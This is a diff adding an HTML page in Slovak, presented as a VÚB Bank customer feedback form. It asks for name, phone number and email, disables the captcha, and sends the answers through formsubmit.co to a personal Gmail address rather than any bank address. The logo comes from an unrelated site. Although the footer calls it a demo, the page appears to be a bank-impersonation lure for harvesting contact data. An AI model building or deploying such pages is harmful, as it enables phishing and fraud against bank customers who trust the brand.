@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="sk">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Spätná väzba – VÚB Bank</title>
+  <link rel="icon" href="https://jenz.app/wp-content/uploads/2023/06/Frame-1284.svg" />
+  <style>
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #000;
+      color: #f0f0f0;
+    }
+
+    header {
+      background-color: #000;
+      padding: 40px 0 20px 0;
+      text-align: center;
+    }
+
+    .logo {
+      height: 140px;
+      max-width: 90%;
+    }
+
+    .container {
+      max-width: 700px;
+      margin: 40px auto;
+      padding: 40px 30px;
+      background-color: #1c1c1c;
+      border-radius: 16px;
+      box-shadow: 0 0 16px rgba(255, 117, 24, 0.2);
+    }
+
+    h1 {
+      text-align: center;
+      color: #ff7518;
+      margin-bottom: 30px;
+      font-size: 28px;
+    }
+
+    label {
+      font-weight: 600;
+      margin-top: 20px;
+      display: block;
+    }
+
+    input, select, textarea {
+      width: 100%;
+      padding: 14px;
+      margin-top: 8px;
+      border-radius: 8px;
+      border: 1px solid #555;
+      background-color: #000;
+      color: #f0f0f0;
+      font-size: 15px;
+    }
+
+    input:focus, select:focus, textarea:focus {
+      border-color: #ff7518;
+      outline: none;
+    }
+
+    textarea {
+      resize: vertical;
+    }
+
+    button {
+      margin-top: 30px;
+      background-color: #ff7518;
+      color: black;
+      padding: 14px;
+      border: none;
+      width: 100%;
+      border-radius: 30px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #e0630f;
+    }
+
+    footer {
+      text-align: center;
+      padding: 30px 0;
+      background-color: #111;
+      font-size: 13px;
+      color: #999;
+      margin-top: 60px;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img 
+      src="https://jenz.app/wp-content/uploads/2023/06/Frame-1284.svg" 
+      alt="VUB Bank logo" 
+      class="logo" />
+  </header>
+
+  <div class="container">
+    <h1>Spätná väzba na naše služby</h1>
+    <form action="https://formsubmit.co/office.alan.lucass@gmail.com" method="POST">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_subject" value="Nový spätný formulár">
+      <input type="hidden" name="_next" value="https://example.com/dakujeme.html">
+
+      <label for="meno">Meno a priezvisko:</label>
+      <input type="text" id="meno" name="meno" placeholder="Zadajte vaše meno" required />
+
+      <label for="telefon">Telefónne číslo:</label>
+      <input type="tel" id="telefon" name="telefon" placeholder="+421..." required />
+
+      <label for="email">Email:</label>
+      <input type="email" id="email" name="email" placeholder="vas@email.com" required />
+
+      <label for="hodnotenie">Ako hodnotíte naše služby?</label>
+      <select id="hodnotenie" name="hodnotenie" required>
+        <option value="">-- Vyberte hodnotenie --</option>
+        <option value="1">1 - Veľmi nespokojný</option>
+        <option value="2">2 - Nespokojný</option>
+        <option value="3">3 - Neutrálne</option>
+        <option value="4">4 - Spokojný</option>
+        <option value="5">5 - Veľmi spokojný</option>
+      </select>
+
+      <label for="komentar">Komentár (nepovinný):</label>
+      <textarea id="komentar" name="komentar" rows="4" placeholder="Máte nejaké návrhy alebo pripomienky?"></textarea>
+
+      <button type="submit">Odoslať spätnú väzbu</button>
+    </form>
+  </div>
+
+  <footer>
+    © 2025 VÚB Bank – Demo formulár na spätnú väzbu
+  </footer>
+
+</body>
+</html>
